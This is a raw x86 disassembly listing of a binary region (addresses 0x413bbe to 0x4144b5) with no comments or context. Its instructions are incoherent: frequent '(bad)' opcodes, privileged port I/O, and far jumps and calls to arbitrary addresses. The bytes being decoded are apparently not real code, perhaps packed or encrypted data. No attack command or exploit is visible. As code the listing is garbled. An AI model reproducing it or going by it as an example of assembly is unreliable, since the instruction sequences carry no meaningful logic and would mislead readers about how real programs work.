  413bbe:	(bad)  
  413bbf:	aam    0x70
  413bc1:	pusha  
  413bc2:	mov    ah,0x21
  413bc4:	adc    ebx,DWORD PTR [edi-0x2]
  413bc7:	lea    ecx,ds:[eax]
  413bca:	call   0x413bd0
	...
  413bdb:	or     DWORD PTR [edi-0x2],ebx
  413bde:	cs mov ebp,0xfb26f638
  413be4:	addr16 mov al,0xa9
  413be7:	retf   
  413be8:	pop    edi
  413be9:	(bad)  
  413bea:	pop    esp
  413beb:	rcl    BYTE PTR [edi-0x2],1
  413bee:	push   cs
  413bef:	test   al,0xaa
  413bf1:	aas    
  413bf2:	add    BYTE PTR [ebp-0x13],bl
  413bf5:	std    
  413bf6:	mov    ch,0x6e
  413bf8:	aad    0xfd
  413bfa:	jmp    DWORD PTR [edx-0x6f]
  413bfd:	ds (bad) 
  413bff:	cmp    eax,0x5e8b3e8
  413c04:	call   0x49dc2506
  413c09:	std    
  413c0a:	jmp    FWORD PTR ds:0x1df7e296
  413c10:	call   0xe87bc1fb
  413c15:	std    
  413c16:	push   DWORD PTR [edi-0x17]
  413c19:	cmc    
  413c1a:	jmp    FWORD PTR [ebp-0x42bf8740]
  413c20:	out    0xfd,eax
  413c22:	mov    ch,0xa6
  413c24:	out    dx,eax
  413c25:	std    
  413c26:	push   edx
  413c28:	aaa    
  413c29:	ds (bad) 
  413c2b:	in     eax,dx
  413c2c:	out    0x43,eax
  413c2e:	clc    
  413c2f:	jecxz  0x413c1b
  413c31:	sti    
  413c32:	(bad)  
  413c33:	fucom  st(7)
  413c35:	jae    0x413c33
  413c37:	shl    BYTE PTR [ecx+0x20ca0010],cl
  413c3d:	ror    DWORD PTR [eax+eax*1],0x0
	...
  413c4d:	add    BYTE PTR [edx+0x39ec8934],bh
  413c53:	(bad)  
  413c56:	mov    bh,BYTE PTR ds:0x5bb7ff4b
  413c5c:	out    0x81,al
  413c5e:	pop    edi
  413c5f:	call   0xe7f8c661
  413c64:	std    
  413c65:	jne    0x413cd9
  413c67:	cmp    esp,DWORD PTR [ebx+0x48]
  413c6a:	retf   
  413c6b:	add    edi,edi
  413c6d:	xor    eax,0x410265
  413c72:	push   edx
  413c73:	mov    bl,bh
  413c75:	(bad)  
  413c76:	jge    0x413c5e
  413c78:	jae    0x413c82
  413c7a:	arpl   WORD PTR [edi+ebx*8-0x25935db9],ax
  413c81:	add    DWORD PTR [ebx+0x6c],esp
  413c84:	and    bh,0xee
  413c87:	popa   
  413c88:	gs (bad) 
  413c8a:	xor    al,0xe2
  413c8c:	data16 (bad) 
  413c8e:	mov    dh,0x64
  413c90:	pop    edx
  413c91:	xchg   ebx,eax
  413c92:	addr16 gs enterw 0x6921,0x2
  413c99:	push   ebp
  413c9a:	call   0x1004bde7
  413c9f:	pop    ss
  413ca0:	iret   
  413ca1:	imul   esp,DWORD PTR [ebx-0x4e],0x5476feb5
  413ca8:	pop    edx
  413ca9:	xor    eax,0x88659736
  413cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413caf:	mov    al,0x79
  413cb1:	xor    al,0x0
	...
  413cbf:	add    BYTE PTR [eax],al
  413cc1:	mov    ds:0xe9ffc334,eax
  413cc6:	inc    ecx
  413cc7:	mov    esi,0x826c2227
  413ccc:	ds arpl ax,di
  413ccf:	shl    BYTE PTR [edi+0x63],0x15
  413cd3:	vunpckhps ymm6,ymm0,YMMWORD PTR [ecx+ebp*8+0x11]
  413cd9:	arpl   WORD PTR [ecx+edi*8-0x41],bp
  413cdd:	aaa    
  413cde:	dec    edi
  413cdf:	int3   
  413ce0:	out    0xc5,eax
  413ce2:	xchg   ebp,eax
  413ce3:	gs (bad) 
  413ce5:	xor    esi,DWORD PTR [edx+eax*1]
  413ce8:	add    BYTE PTR [esi+esi*2-0x52e5f726],al
  413cef:	add    dl,BYTE PTR [eax-0x7c]
  413cf2:	mov    eax,ds:0x48d3e7fa
  413cf7:	dec    BYTE PTR gs:[ebx+0x6cff25d8]
  413cfe:	ret    
  413cff:	add    eax,DWORD PTR [esi-0x1d]
  413d02:	add    eax,0x5bd603e7
  413d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d08:	addr16 xchg ecx,eax
  413d0a:	inc    ebp
  413d0b:	dec    edi
  413d0c:	dec    bp
  413d0e:	pop    esi
  413d0f:	or     eax,0xee1cf671
  413d14:	lock stc 
  413d16:	pop    ebp
  413d17:	jae    0x413d80
  413d19:	xor    eax,0x545be0d8
  413d1e:	and    dh,ch
  413d20:	test   DWORD PTR gs:[edi+0x42af],edi
	...
  413d33:	add    BYTE PTR [eax+0x5],ah
  413d36:	xor    al,0x79
  413d38:	or     BYTE PTR [edx+0x57a68ac],al
  413d3e:	inc    ebx
  413d3f:	mov    ch,0x5
  413d41:	fdiv   st,st(0)
  413d43:	pop    ebx
  413d44:	mov    edx,0xeb65be20
  413d49:	(bad)  
  413d4a:	mov    ah,0xda
  413d4c:	in     al,dx
  413d4d:	in     eax,0xf6
  413d4f:	mov    edx,0xe1105a3
  413d54:	sub    al,ah
  413d56:	call   0xc067ccbf
  413d5b:	ret    0x65cc
  413d5e:	push   0xf15dc5c2
  413d63:	inc    ebx
  413d64:	xor    ah,bh
  413d66:	sbb    ah,bl
  413d68:	mov    ah,0x5d
  413d6a:	test   DWORD PTR [esi-0x3ce039bc],esp
  413d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d71:	int    0x65
  413d73:	out    dx,eax
  413d74:	fs ins DWORD PTR es:[edi],dx
  413d76:	std    
  413d77:	fist   WORD PTR [ebp+0x4db9405d]
  413d7d:	pop    esi
  413d7e:	dec    ebp
  413d7f:	fadd   QWORD PTR [ebp+ebx*2-0x39fb59ab]
  413d86:	scas   eax,DWORD PTR es:[edi]
  413d87:	ret    0xe574
  413d8a:	push   esi
  413d8c:	test   eax,0x742dffc4
  413d91:	add    eax,0x5c3cb7e8
  413d96:	(bad)  
  413d97:	push   ds
	...
  413da4:	add    BYTE PTR [eax],al
  413da6:	add    BYTE PTR [ecx+eiz*2-0x2],al
  413daa:	pushf  
  413dab:	dec    eax
  413dac:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413dae:	int    0xbf
  413db0:	pop    ebx
  413db1:	enter  0x632b,0x5
  413db5:	push   ebp
  413db6:	jb     0x413d53
  413db8:	xchg   ebx,eax
  413dba:	cmc    
  413dbb:	push   ds
  413dbc:	mov    ah,0x69
  413dbe:	jmp    0x5d400acd
  413dc3:	pop    ds
  413dc4:	gs dec eax
  413dc6:	sbb    eax,0x2c885b7e
  413dcb:	jnp    0x413d5c
  413dcd:	xor    al,0x29
  413dcf:	addr16 (bad) 
  413dd1:	push   DWORD PTR [ecx+0x45]
  413dd4:	shl    DWORD PTR [edi],0x28
  413dd7:	pop    edi
  413dd8:	test   DWORD PTR [esi],edi
  413dda:	jmp    0x17a8ffdb
  413ddf:	test   al,0xc5
  413de1:	(bad)  
  413de2:	cmp    eax,0xe9108a3f
  413de7:	pusha  
  413de8:	adc    al,al
  413dea:	sbb    eax,0x58e7b366
  413def:	or     BYTE PTR [esi+edi*8+0x19],bl
  413df3:	lahf   
  413df4:	pop    esp
  413df5:	dec    BYTE PTR [esi+0x205fe4fe]
  413dfb:	mov    al,ds:0xb56e4e5c
  413e00:	add    al,0xe8
  413e02:	mov    al,BYTE PTR [ebx+0x4f51fe5b]
  413e08:	sbb    bh,bh
  413e0a:	push   esi
	...
  413e17:	add    BYTE PTR [eax],al
  413e19:	add    BYTE PTR [ebx],ch
  413e1b:	add    eax,0x53e6946
  413e20:	jne    0x413e22
  413e22:	and    BYTE PTR [edx-0x50b5cc06],bl
  413e28:	std    
  413e29:	push   DWORD PTR ds:0x72aef0e1
  413e2f:	pop    ecx
  413e30:	jae    0x413ded
  413e32:	test   DWORD PTR [ebx-0x6],ebp
  413e35:	(bad)  
  413e36:	out    dx,eax
  413e37:	pop    edi
  413e38:	out    0x2b,al
  413e3a:	ss loope 0x413e3a
  413e3d:	pop    edi
  413e3e:	hlt    
  413e3f:	push   ds
  413e40:	rol    DWORD PTR [edx+ecx*2],0x4b
  413e44:	mov    esp,ebp
  413e46:	leave  
  413e47:	sbb    al,0xfb
  413e49:	push   esi
  413e4a:	int    0x3d
  413e4c:	(bad)  
  413e4d:	imul   ecx,ebx,0x320873e0
  413e53:	int3   
  413e54:	cmp    edi,edi
  413e56:	xor    eax,0x81fc438a
  413e5b:	(bad)  
  413e5c:	aas    
  413e5d:	sub    BYTE PTR [ebx],bh
  413e5f:	add    DWORD PTR [ebx+0x41294e3d],ecx
  413e65:	add    BYTE PTR [edx+0x3f740028],cl
  413e6b:	imul   ebp,DWORD PTR [edx+0x49],0xe857013b
  413e72:	ficom  DWORD PTR [eax-0x2]
  413e75:	call   ecx
  413e77:	(bad)  
  413e78:	jb     0x413e99
  413e7a:	mov    ecx,gs
  413e7c:	xor    DWORD PTR [eax+0x0],ecx
	...
  413e8b:	add    BYTE PTR [eax],al
  413e8d:	aad    0xe7
  413e8f:	dec    esi
  413e90:	push   0xbeef07ca
  413e95:	push   edx
  413e96:	addr16 inc edi
  413e98:	inc    ecx
  413e99:	mov    edx,0xc275fd97
  413e9e:	out    dx,eax
  413e9f:	and    esp,DWORD PTR [ebx+0x5]
  413ea2:	call   0xe8b5908d
  413ea7:	std    
  413ea8:	jmp    0x413f0d
  413eaa:	ins    DWORD PTR es:[edi],dx
  413eab:	enter  0x457f,0x6e
  413eaf:	xlat   BYTE PTR ds:[ebx]
  413eb0:	stc    
  413eb1:	and    eax,0xbac016c2
  413eb6:	sbb    ah,BYTE PTR [ebx-0x2]
  413eb9:	ins    BYTE PTR es:[edi],dx
  413eba:	pop    ds
  413ebb:	mov    dl,0x37
  413ebd:	pop    esp
  413ebe:	xchg   ecx,eax
  413ebf:	popf   
  413ec0:	(bad)  
  413ec1:	(bad)  
  413ec2:	and    BYTE PTR [ebx+0x74],ah
  413ec5:	imul   esi,esp,0xffffffb0
  413ec8:	cmp    cl,BYTE PTR [esp+esi*8-0x3e]
  413ecc:	pop    ebp
  413ecd:	sbb    ch,BYTE PTR [edi]
  413ecf:	or     BYTE PTR [eax],al
  413ed1:	xchg   esi,eax
  413ed2:	xlat   BYTE PTR ds:[ebx]
  413ed3:	outs   dx,DWORD PTR ds:[esi]
  413ed4:	sbb    BYTE PTR [edi],0x59
  413ed7:	in     al,dx
  413ed8:	(bad)  
  413ed9:	mov    edx,0x5b74617e
  413ede:	add    al,0xd3
  413ee0:	cmp    bl,BYTE PTR [esp+eiz*2]
  413ee3:	mov    eax,DWORD PTR [edi+edx*1-0x4b]
  413ee7:	mov    WORD PTR [eax-0x5e],cs
  413eea:	ins    BYTE PTR es:[edi],dx
  413eeb:	popa   
  413eec:	je     0x413f49
  413eee:	inc    esp
  413eef:	rcr    bh,1
	...
  413efd:	add    BYTE PTR [eax],al
  413eff:	add    ah,bh
  413f01:	inc    ebx
  413f02:	popa   
  413f03:	je     0x413efc
  413f05:	fwait
  413f06:	xlat   BYTE PTR ds:[ebx]
  413f07:	pop    es
  413f08:	sti    
  413f09:	push   ss
  413f0a:	pop    ds
  413f0b:	jmp    esp
  413f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0e:	inc    esp
  413f0f:	add    esp,DWORD PTR [ebx+0x19]
  413f12:	(bad)  
  413f13:	jmp    0x413ef5
  413f15:	mov    al,ds:0xa53b565e
  413f1a:	cmp    al,0x3f
  413f1c:	arpl   WORD PTR [esp+edx*8+0x0],si
  413f20:	mov    al,ds:0xb7444983
  413f25:	ins    BYTE PTR es:[edi],dx
  413f26:	add    al,BYTE PTR [eax]
  413f28:	arpl   WORD PTR [ebx],dx
  413f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2b:	dec    eax
  413f2c:	and    ch,BYTE PTR [ecx+eiz*2+0x74]
  413f30:	imul   eax,DWORD PTR ds:0xcf8e0876,0xffffffa7
  413f37:	add    eax,DWORD PTR [edi]
  413f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3a:	sbb    BYTE PTR [ebx+eiz*2],al
  413f3d:	add    eax,0x562db69
  413f42:	mov    ebp,0xf0d0740b
  413f47:	imul   edi,DWORD PTR [ecx],0x10
  413f4a:	bound  edi,QWORD PTR ss:[ebx-0x63]
  413f4e:	call   0xc4aea256
  413f53:	retf   0x5a55
  413f56:	sbb    eax,0x66d64d8
  413f5b:	sbb    al,0x44
  413f5d:	pop    edx
  413f5e:	dec    ecx
  413f5f:	push   esp
  413f60:	stos   BYTE PTR es:[edi],al
  413f61:	(bad)  
  413f62:	call   0x41404e
	...
  413f73:	xor    eax,0x6303e910
  413f78:	add    eax,0x5ac04762
  413f7d:	mov    bl,0x3
  413f7f:	arpl   WORD PTR ds:0xeda4b6e9,ax
  413f85:	cmp    DWORD PTR ds:0xc241054c,0x29
  413f8c:	(bad)
  413f8f:	or     BYTE PTR [ebx+ecx*1-0x16fa9cfc],0x60
  413f97:	ja     0x413fa6
  413f99:	mov    dh,0xf9
  413f9b:	jecxz  0x413fb6
  413f9d:	add    al,ah
  413f9f:	pushf  
  413fa0:	add    eax,0x5ce0011d
  413fa5:	clc    
  413fa6:	xlat   BYTE PTR ds:[ebx]
  413fa7:	pop    ebx
  413fa8:	inc    edx
  413fa9:	sub    esp,DWORD PTR [eax+0x63]
  413fac:	add    eax,0xf3c803e9
  413fb1:	test   DWORD PTR [edi],edx
  413fb3:	mov    dl,0xce
  413fb5:	daa    
  413fb6:	add    al,0xac
  413fb8:	(bad)  
  413fba:	jl     0x413f51
  413fbc:	(bad)  
  413fbd:	inc    DWORD PTR [eax+0x66ff12de]
  413fc3:	fiadd  WORD PTR [ebp+0x17]
  413fc6:	push   edx
  413fc7:	call   0xbb0:0xd6458ab0
  413fce:	bound  esp,QWORD PTR [ecx+ecx*1-0x75974401]
  413fd5:	jg     0x413f58
	...
  413fe3:	add    BYTE PTR [eax],al
  413fe5:	add    BYTE PTR [edi+0x5],ah
  413fe8:	add    BYTE PTR [esi],dh
  413fea:	lea    ecx,ds:0x58ab698f
  413ff0:	(bad)  
  413ff1:	jmp    0x6e5116b9
  413ff6:	out    0x94,eax
  413ff8:	(bad)  
  413ff9:	call   0x147dc45e
  413ffe:	sub    eax,0xce8ffc6
  414003:	idiv   dh
  414005:	mov    ah,0x91
  414007:	into   
  414008:	inc    eax
  414009:	jmp    0xa43651d1
  41400e:	and    DWORD PTR [ecx-0x1a],ebx
  414011:	add    DWORD PTR [edx+0x58],edi
  414014:	(bad)  
  414015:	mov    eax,ds:0xe9000560
  41401a:	lds    eax,FWORD PTR [esi+0x23]
  41401d:	jmp    0xe945c826
  414022:	pusha  
  414023:	add    eax,0x49b6a00
  414028:	xor    esi,0x60
  41402b:	or     BYTE PTR [ebp-0x1a8bc12],al
  414031:	jb     0x413fd0
  414033:	pop    esp
  414034:	pop    esi
  414035:	mov    al,0x26
  414037:	add    al,0x0
  414039:	aas    
  41403a:	mov    bh,0x4b
  41403c:	fisubr DWORD PTR [ecx]
  41403e:	addr16 pop ebp
  414040:	jno    0x414042
  414042:	retf   
  414043:	sar    ebp,0x8b
  414046:	repz sub esi,esi
  414049:	mov    eax,DWORD PTR [eax]
	...
  414057:	add    BYTE PTR [eax],al
  414059:	add    ebp,DWORD PTR [ebp+0x7e]
  41405c:	test   al,0xb8
  41405e:	add    ecx,DWORD PTR [ebx-0x38766337]
  414064:	jmp    0x4140c8
  414066:	mov    al,bh
  414068:	add    esi,DWORD PTR [ecx+ecx*4]
  41406b:	(bad)  
  41406c:	push   eax
  41406d:	add    ebx,ecx
  41406f:	out    0xa7,al
  414071:	ins    BYTE PTR es:[edi],dx
  414072:	add    al,0x0
  414074:	mov    esi,DWORD PTR [ebx]
  414076:	pushf  
  414077:	mov    ecx,ecx
  414079:	jns    0x41403d
  41407b:	mov    ecx,ecx
  41407d:	cld    
  41407e:	or     dh,dh
  414080:	jne    0x4140e8
  414082:	inc    esi
  414083:	rcl    DWORD PTR [ebp-0x2f],0xe8
  414087:	data16 or BYTE PTR [esi-0x270801bc],cl
  41408e:	add    al,bl
  414090:	push   DWORD PTR [ecx+0x7a0b063f]
  414096:	xor    BYTE PTR [edx],cl
  414098:	jmp    0x4140d1
  41409a:	out    0x6,al
  41409c:	inc    BYTE PTR [edx]
  41409e:	inc    esp
  41409f:	jle    0x4140d9
  4140a1:	or     bh,BYTE PTR ds:0xcb8c9f4
  4140a7:	add    BYTE PTR [ebp-0x7f],dl
  4140aa:	aad    0x81
  4140ac:	les    edx,FWORD PTR [esi]
  4140ae:	xchg   esp,eax
  4140af:	data16 xor BYTE PTR [esi+0x28f7fe40],bh
  4140b6:	add    al,bl
  4140b8:	push   DWORD PTR [ebp+0xf24d]
	...
  4140ca:	add    BYTE PTR [eax],al
  4140cc:	retf   0x3
  4140cf:	sub    esp,DWORD PTR [ecx-0x7503bc8b]
  4140d5:	mov    eax,0x86630873
  4140da:	js     0x4140e9
  4140dc:	arpl   WORD PTR [esi-0x79],bp
  4140df:	mov    edi,0x745d993b
  4140e4:	pop    ebx
  4140e5:	jbe    0x41410f
  4140e7:	xor    al,0xa4
  4140e9:	into   
  4140ea:	mov    WORD PTR [ebx+ebx*4+0x2d],es
  4140ee:	mov    ah,0xe7
  4140f0:	pop    es
  4140f1:	and    bl,BYTE PTR [edi-0x2]
  4140f4:	fisub  DWORD PTR [eax-0x4df101aa]
  4140fa:	imul   edx,DWORD PTR [ebx+0x6e],0x6e
  4140fe:	add    cl,BYTE PTR [ebx]
  414100:	mov    ds:0xf6fef699,eax
  414105:	lds    ebx,FWORD PTR [esi+0x74]
  414108:	outs   dx,DWORD PTR ds:[esi]
  414109:	jge    0x414175
  41410b:	xchg   DWORD PTR [edi-0x3101a0d9],ebx
  414111:	and    BYTE PTR [ecx+eax*2+0x5e],ch
  414115:	ins    BYTE PTR es:[edi],dx
  414116:	add    bh,bh
  414118:	into   
  414119:	fs push 0xfffffff3
  41411c:	jbe    0x414125
  41411e:	pop    edi
  41411f:	xor    BYTE PTR [esi+0x4d740258],0x74
  414126:	cmovnp esp,DWORD PTR [edx+0x17745d6c]
  41412d:	add    eax,0xd93
	...
  41413e:	add    BYTE PTR [ebx+0x6c],ah
  414141:	or     eax,eax
  414143:	xchg   edi,eax
  414144:	popa   
  414145:	cdq    
  414146:	add    BYTE PTR [ebx+0x6c],ah
  414149:	add    bh,bh
  41414b:	jbe    0x41417d
  41414d:	push   0x5
  41414f:	aaa    
  414150:	aas    
  414151:	pop    ebp
  414152:	mov    ah,BYTE PTR [eax]
  414154:	and    al,0x4d
  414156:	rcr    DWORD PTR [edi+0x6c],0xb7
  41415a:	mov    cl,bh
  41415c:	les    ebx,FWORD PTR [ebp-0x16fadc25]
  414162:	pop    ebx
  414163:	push   edx
  414164:	add    al,0xaa
  414166:	pop    esi
  414167:	(bad)
  41416a:	imul   ecx,DWORD PTR [edi+0x4a5e8e0f],0xd
  414171:	adc    DWORD PTR [edi],ecx
  414173:	jnp    0x414139
  414175:	call   0x814e70d8
  41417a:	fcom   QWORD PTR [esi+edx*2+0x6d]
  41417e:	jmp    0x2c5a2edf
  414183:	and    al,BYTE PTR ds:0x6d5cd85e
  414189:	ret    0x7c1b
  41418c:	push   esi
  41418d:	dec    ebp
  41418e:	fcomp  DWORD PTR [ebp+ebp*2+0x34]
  414192:	pusha  
  414193:	ins    DWORD PTR es:[edi],dx
  414194:	push   esi
  414195:	add    BYTE PTR [ebx+eiz*2],0x5
  414199:	jmp    0xe94263ea
  41419e:	mov    eax,0x476968e9
	...
  4141af:	add    BYTE PTR [eax],al
  4141b1:	add    BYTE PTR [ebp+ebp*8-0x1d],dl
  4141b5:	inc    eax
  4141b6:	test   BYTE PTR ds:0x4263d111,al
  4141bc:	or     eax,0x609af5e
  4141c1:	fsub   DWORD PTR [ebp+ebp*2+0x78]
  4141c5:	sbb    DWORD PTR [esi+edx*2],esp
  4141c8:	sub    eax,0xe90418c8
  4141cd:	add    esp,DWORD PTR [ebx-0x78]
  4141d0:	sub    ebx,DWORD PTR [esp+ebx*4-0x13]
  4141d4:	out    0xc8,eax
  4141d6:	mov    ds:0xa44ac105,eax
  4141db:	push   esi
  4141dc:	int    0x9
  4141de:	and    edx,ecx
  4141e0:	or     dh,BYTE PTR [ecx+eiz*8+0x6ff4c0d7]
  4141e7:	out    dx,eax
  4141e8:	inc    DWORD PTR [edx-0x29]
  4141eb:	(bad)  
  4141ee:	jae    0x41425d
  4141f0:	fnclex 
  4141f2:	das    
  4141f3:	push   edi
  4141f4:	or     ch,BYTE PTR [ecx+0x2cc6feab]
  4141fa:	inc    ebx
  4141fb:	push   esi
  4141fc:	(bad)  
  4141fd:	jmp    0xc2a5af62
  414202:	xorps  xmm1,XMMWORD PTR [edx-0x3eb2bcdc]
  414209:	loope  0x41426b
  41420b:	mov    al,0x8a
  41420d:	jge    0x4141e1
  41420f:	fstp   QWORD PTR [edi+0x44]
  414212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414213:	push   ebp
  414214:	neg    bl
	...
  414222:	add    BYTE PTR [eax],al
  414224:	add    BYTE PTR [ecx+0x42],ah
  414227:	inc    BYTE PTR [edx]
  414229:	cmp    dl,BYTE PTR [edi+0x74]
  41422c:	loope  0x414236
  41422e:	mov    edi,0xb0e46fe
  414233:	shr    dh,0xdc
  414236:	outs   dx,DWORD PTR ds:[esi]
  414237:	(bad)  
  414238:	call   0xe1b5969d
  41423d:	enter  0x3150,0x26
  414241:	scas   al,BYTE PTR es:[edi]
  414242:	(bad)  
  414243:	mov    edi,0x895e5d94
  414248:	jmp    0x954047ad
  41424d:	fs push esp
  41424f:	je     0x414242
  414251:	mov    eax,0x87fefeeb
  414256:	push   ebx
  414257:	je     0x41423a
  414259:	mov    BYTE PTR [ebx],bl
  41425b:	cmp    ch,dh
  41425d:	mov    bh,0xff
  41425f:	mov    edi,0x7060615c
  414264:	fisubr WORD PTR ds:0x58a0e80d
  41426a:	push   esp
  41426b:	(bad)  
  41426c:	loop   0x41420e
  41426e:	fld    DWORD PTR [ecx]
  414270:	add    BYTE PTR [ecx],dl
  414272:	data16 std 
  414274:	jne    0x414268
  414276:	loopne 0x414297
  414278:	cmp    DWORD PTR ds:0x8fc009b2,edx
  41427e:	pop    es
  41427f:	jmp    0x4142d6
  414281:	jb     0x41421e
  414283:	and    eax,0x73b1ba41
  414288:	or     BYTE PTR [eax],al
	...
  414296:	add    BYTE PTR [eax],al
  414298:	loop   0x414228
  41429a:	cmp    bh,bh
  41429c:	in     eax,0xfd
  41429e:	mov    edi,0x40ddb875
  4142a3:	jmp    FWORD PTR [edi-0x2d651800]
  4142a9:	mov    cl,0xfd
  4142ab:	or     ecx,edx
  4142ad:	cmp    eax,DWORD PTR [eax]
  4142af:	jmp    0x41431f
  4142b1:	mov    dl,0x73
  4142b3:	or     BYTE PTR [edx],dh
  4142b5:	mov    dh,0x36
  4142b7:	call   DWORD PTR ds:0x8875bffd
  4142bd:	frstor [edi+edi*8]
  4142c0:	scas   eax,DWORD PTR es:[edi]
  4142c1:	add    al,ch
  4142c3:	xchg   DWORD PTR [eax-0x4f],ebp
  4142c6:	std    
  4142c7:	adc    DWORD PTR [edx+0x61027728],0xffffffc9
  4142ce:	or     eax,eax
  4142d0:	out    dx,al
  4142d1:	push   esp
  4142d2:	cmp    eax,DWORD PTR [eax]
  4142d4:	cmp    bl,BYTE PTR [eax-0x2]
  4142d7:	jb     0x41431f
  4142d9:	ins    DWORD PTR es:[edi],dx
  4142da:	(bad)  
  4142db:	dec    DWORD PTR [edx+0x8]
  4142de:	jmp    0x4142e5
  4142e0:	mov    eax,ds:0x3a000005
  4142e5:	jge    0x4142a8
  4142e7:	pop    ebx
  4142e8:	inc    ebx
  4142e9:	mov    BYTE PTR [esi],0x0
  4142ec:	out    dx,eax
  4142ed:	jl     0x4142d9
  4142ef:	push   0x3f0f5b
  4142f4:	add    bh,BYTE PTR [ebx]
  4142f6:	inc    edx
  4142f8:	arpl   WORD PTR [ebx],di
  4142fa:	pop    edx
  4142fb:	je     0x4142fd
	...
  414309:	add    BYTE PTR [eax],al
  41430b:	addr16 inc ebx
  41430d:	rol    BYTE PTR [edi],1
  41430f:	sti    
  414310:	add    ebx,DWORD PTR [ebx-0x2]
  414313:	in     al,0x56
  414315:	inc    edx
  414316:	je     0x414391
  414318:	fwait
  414319:	ror    BYTE PTR [ebx],1
  41431b:	aam    0x18
  41431d:	or     al,0xe8
  41431f:	je     0x4142cc
  414321:	pop    edx
  414322:	(bad)  
  414323:	pop    eax
  414324:	sahf   
  414325:	ror    BYTE PTR [edx],1
  414327:	mov    esp,0x2eff07f0
  41432c:	pushw  0x7
  41432f:	lods   al,BYTE PTR ds:[esi]
  414330:	mov    bl,BYTE PTR [edx-0x38]
  414333:	mov    eax,ds:0xe8550255
  414338:	mov    DWORD PTR [esi-0x4d11803d],eax
  41433e:	addr16 add ecx,esp
  414341:	ret    
  414342:	dec    DWORD PTR [edi+ebp*1+0x67cc303]
  414349:	aas    
  41434a:	out    0xa1,eax
  41434c:	xchg   esi,eax
  41434d:	pop    ecx
  41434e:	(bad)  
  41434f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414350:	mov    al,ds:0x5d64ff66
  414355:	add    cl,BYTE PTR [ebp-0x184c375a]
  41435b:	jmp    0x66a9:0xe0fe594d
  414362:	dec    edi
  414364:	add    al,0x89
  414366:	inc    esp
  414367:	dec    edi
  414368:	lea    ebp,[edx+0x79]
  41436b:	jb     0x414370
  41436d:	pop    ebx
  41436e:	add    BYTE PTR [eax],0x0
	...
  41437d:	add    BYTE PTR [esi+0x5a7503f8],ch
  414383:	loope  0x414345
  414385:	jmp    0x41433a
  414387:	add    al,0xef
  414389:	xor    BYTE PTR [esp+eiz*2],dl
  41438c:	test   DWORD PTR [edi+edi*8+0x5],edi
  414390:	jmp    0xe8c5229f
  414395:	add    esp,DWORD PTR [ebx-0x80]
  414398:	sub    edx,DWORD PTR [esp+eiz*4+0x52]
  41439c:	push   ebx
  41439d:	push   0x5ac5dd04
  4143a2:	in     eax,0x86
  4143a4:	rol    BYTE PTR [esi+edx*2],0xd0
  4143a8:	jne    0x41438f
  4143aa:	jge    0x414370
  4143ac:	call   0x2b8b6f1f
  4143b1:	pusha  
  4143b2:	pop    edx
  4143b3:	add    eax,0xc8a403e9
  4143b8:	add    BYTE PTR [ebx],0x63
  4143bb:	add    eax,0x5d2788e9
  4143c0:	sbb    BYTE PTR [ebx+0x2f],bl
  4143c3:	popa   
  4143c4:	adc    eax,0x75af916c
  4143c9:	pop    edx
  4143ca:	imul   eax,DWORD PTR [ebp-0xc],0x50d0e1f3
  4143d1:	add    ecx,DWORD PTR [edi]
  4143d3:	call   FWORD PTR [ebp-0x30]
  4143d6:	test   BYTE PTR [ebp+0x11],bl
  4143d9:	pop    ecx
  4143da:	jne    0x41442e
  4143dc:	popa   
  4143dd:	cmp    ebp,DWORD PTR [ebp-0x28]
  4143e0:	push   eax
  4143e1:	imul   eax,DWORD PTR [eax],0x0
	...
  4143f0:	add    BYTE PTR ds:0x695a3e14,dh
  4143f6:	cs mov ebx,0x44cfe1f0
  4143fc:	add    edx,edi
  4143fe:	add    ah,BYTE PTR [esi]
  414400:	enter  0xdd40,0x70
  414404:	idiv   BYTE PTR [edx+edx*2]
  414407:	add    BYTE PTR [esi+0x69],dh
  41440a:	add    eax,0x5df56ee9
  41440f:	out    0xc2,eax
  414411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414412:	adc    ch,cl
  414414:	rcr    BYTE PTR [edx],1
  414416:	retf   0x68ff
  414419:	jns    0x414420
  41441b:	je     0x414402
  41441d:	pop    ebp
  41441e:	cs jae 0x4143a8
  414421:	push   esi
  414422:	cs jae 0x41441e
  414425:	push   cs
  414426:	add    cl,BYTE PTR [ebp+0x67c28f2c]
  41442c:	call   0xd1410950
  414431:	mov    bh,0xc8
  414433:	(bad)  
  414434:	mov    esi,0xc1ebd93a
  414439:	inc    edi
  41443a:	and    bh,bh
  41443c:	scas   al,BYTE PTR es:[edi]
  41443d:	fiadd  WORD PTR [esi+0x5e]
  414440:	inc    edx
  414441:	sbb    BYTE PTR [edi+0x54],al
  414444:	jb     0x414491
  414446:	test   ebx,eax
  414448:	dec    ecx
  414449:	sbb    DWORD PTR [ebx-0x2],edx
  41444c:	ss icebp 
  41444e:	jmp    0x51e0eaa2
  414453:	idiv   bl
	...
  414461:	add    BYTE PTR [eax],al
  414463:	add    BYTE PTR [ecx+0x46],ah
  414466:	(bad)  
  414467:	ss in  al,0x2a
  41446a:	inc    ecx
  41446b:	jmp    0xf6415750
  414470:	add    al,0x3f
  414472:	add    cl,ch
  414474:	pusha  
  414475:	add    BYTE PTR [ebp+ebx*2-0x4601ace7],0xb3
  41447d:	imul   ebp,DWORD PTR [edi],0xa530ba1
  414483:	sub    DWORD PTR [edx-0x77],ebp
  414486:	mov    ds:0x830560e8,eax
  41448b:	ins    BYTE PTR es:[edi],dx
  41448c:	mov    bl,0x52
  41448e:	(bad)  
  41448f:	es pop edi
  414491:	add    BYTE PTR [esi+esi*2+0x64000560],al
  414498:	mov    ah,0xa8
  41449a:	std    
  41449b:	push   cs
  41449c:	mov    al,al
  41449e:	inc    BYTE PTR [eax]
  4144a0:	addr16 mov ch,0xfc
  4144a3:	call   FWORD PTR ds:0xd37ecdd
  4144a9:	scas   al,BYTE PTR es:[edi]
  4144aa:	sub    esi,esi
  4144ac:	add    DWORD PTR [eax-0x5202015e],0xffffffe9
  4144b3:	aaa    
  4144b4:	push   esp
  4144b5:	(bad)  
